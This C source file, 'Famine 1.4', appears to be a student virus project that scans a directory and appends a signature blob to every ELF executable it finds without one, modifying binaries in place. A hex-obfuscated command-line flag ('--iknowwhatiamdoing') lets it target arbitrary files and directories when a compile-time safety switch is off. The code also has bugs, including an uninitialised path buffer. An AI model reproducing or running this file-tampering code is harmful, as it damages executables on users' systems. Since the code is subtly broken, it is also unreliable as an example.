#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <limits.h>

#ifndef FM_TARGET
# define FM_TARGET "./target"
#endif

#ifndef FM_SECURITY
# define FM_SECURITY 1
#endif

void famine(char *name, char *path)
{
	struct stat statbuf;


	static const char signature[] = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0              .\n           ,'/ \\`.\n          |\\/___\\/|\n          \\'\\   /`/\n           `.\\ /,'\n              |\n              |\n             |=|\n        /\\  ,|=|.  /\\\n    ,'`.  \\/ |=| \\/  ,'`.\n  ,'    `.|\\ `-' /|,'    `.\n,'   .-._ \\ `---' / _,-.   `.\n   ,'    `-`-._,-'-'    `.\n  '                       `\nFamine 1.4 by mbrement and mgama";
	static const char elf_magic[] = {0x7f, 'E', 'L', 'F'};
	static const size_t elf_magic_size = sizeof(elf_magic);

	char full_path[PATH_MAX + 1 + PATH_MAX];
	if (path != NULL)
	{
		strcpy(full_path, path);
		strcat(full_path, "/");
	}
	strcat(full_path, name);
	if (lstat(full_path, &statbuf) == -1)
		return ;
    if (S_ISLNK(statbuf.st_mode))
		return ;

	int fd = open(full_path, O_RDWR);
	if (fd == -1)
		return ;
	char buf[elf_magic_size];
	int n = read(fd, buf, elf_magic_size);
	// check if read has an error or if the number of byte if less than `elf_magic_size`
	if (n <= 0 || n < elf_magic_size)
		return ;

	if (strncmp(buf, elf_magic, elf_magic_size) != 0)
	{
		// printf("not an elf file");
		close(fd);
		return ;
	}

	char sign_buf[sizeof(signature)];

	// printf("reading file: %s\n", full_path);
	size_t pos = lseek(fd, 0, SEEK_END);
	lseek(fd, pos - sizeof(signature), SEEK_SET);
	// check if read has an error or if the number of byte if less than `sizeof(signature)`
	n = read(fd, sign_buf, sizeof(signature));
	if (n <= 0 || n < sizeof(signature))
		return ;

	size_t i = 0;
	while (signature[i] == sign_buf[i] && i < sizeof(signature))
		i++;

	// printf("has signature: %d\n", i == sizeof(signature));
	if (i == sizeof(signature))
	{
		close(fd);
		return ;
	}

	// printf("writing signature\n");
	lseek(fd, pos, SEEK_SET);
	write(fd, signature, sizeof(signature));
}

void	custom_target(int argc, char **argv)
{
	struct stat statbuf;
	DIR *dir;

	for (int i = 0; i < argc; i++)
	{
		// printf("target %s\n", argv[i]);

		if (lstat(argv[i], &statbuf) == -1)
			continue;
		// printf("target exists, isfile %d\n", S_ISREG(statbuf.st_mode));
		if (S_ISREG(statbuf.st_mode))
		{
			famine(argv[i], NULL);
			continue;
		}
		dir = opendir(argv[i]);
		if (!dir)
			continue;
		for (struct dirent *d = readdir(dir); d != NULL; d = readdir(dir))
		{
			famine(d->d_name, argv[i]);
		}
		closedir(dir);
	}
}

int main(int argc, char **argv)
{
	const char no_xsec[] = "\x2D\x2D\x69\x6B\x6E\x6F\x77\x77\x68\x61\x74\x69\x61\x6D\x64\x6F\x69\x6E\x67";
	DIR *dir;
	struct dirent *d;

	if (FM_SECURITY == 0 && argc > 1 && argv[1] && strncmp(argv[1], no_xsec, sizeof(no_xsec)) == 0)
	{
		custom_target(argc - 2, argv + 2);
		return (0);
	}

	dir = opendir(FM_TARGET);
	if (!dir)
		return (0);

	if (argc == 1)
	{
		while ((d = readdir(dir)) != NULL)
			famine(d->d_name, FM_TARGET);
	}
	else
	{
		for (int i = 1; i < argc; i++)
			famine(argv[i], FM_TARGET);
	}
	closedir(dir);
	return 0;
}